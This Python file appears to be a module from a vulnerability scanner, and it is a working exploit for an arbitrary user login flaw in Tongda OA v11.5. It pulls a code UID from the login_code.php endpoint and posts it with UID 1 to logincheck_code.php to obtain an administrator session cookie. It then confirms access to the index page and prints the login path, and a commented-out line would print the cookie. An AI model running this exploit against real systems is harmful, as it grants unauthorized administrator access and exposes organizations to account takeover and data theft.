import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging



def 通达OA_v11_5_任意用户登录(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        }
    exp_url=urldata+'general/login_code.php'
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(url=exp_url, headers=headers, verify=False)
        responseText = str(response.text).split('{')
        codeUid = responseText[-1].replace('}"}', '').replace('\r\n', '')
        getSessUrl = urldata+'logincheck_code.php'
        response = requests.post(getSessUrl, data={'CODEUID': '{'+codeUid+'}', 'UID': '1'},headers=headers)
        tmp_cookie = response.headers['Set-Cookie']
        headers["Cookie"] = tmp_cookie
        login_url= urldata + 'general/index.php'
        check_available = requests.get(login_url,headers=headers)
        if '用户未登录' not in check_available.text:
            if '重新登录' not in check_available.text:
                # print(Vcolors.RED + "[+] 存在通达OA_v11.5_任意用户登录漏洞,粘贴cookie尝试登录:{}".format(tmp_cookie) +Vcolors.ENDC)
                print(Vcolors.RED + "[+] 登录路径为:{}".format(login_url) + Vcolors.ENDC)
            else:
                print(Vcolors.WARNING + "[x] 不存在通达OA_v11.5_任意用户登录漏洞" + Vcolors.ENDC)
        else:
            print(Vcolors.WARNING + "[x] 不存在通达OA_v11.5_任意用户登录漏洞" + Vcolors.ENDC)
    except KeyError as e:
        pass
    except:
        logging.error("通达OA_v11_5_任意用户登录脚本出现异常")



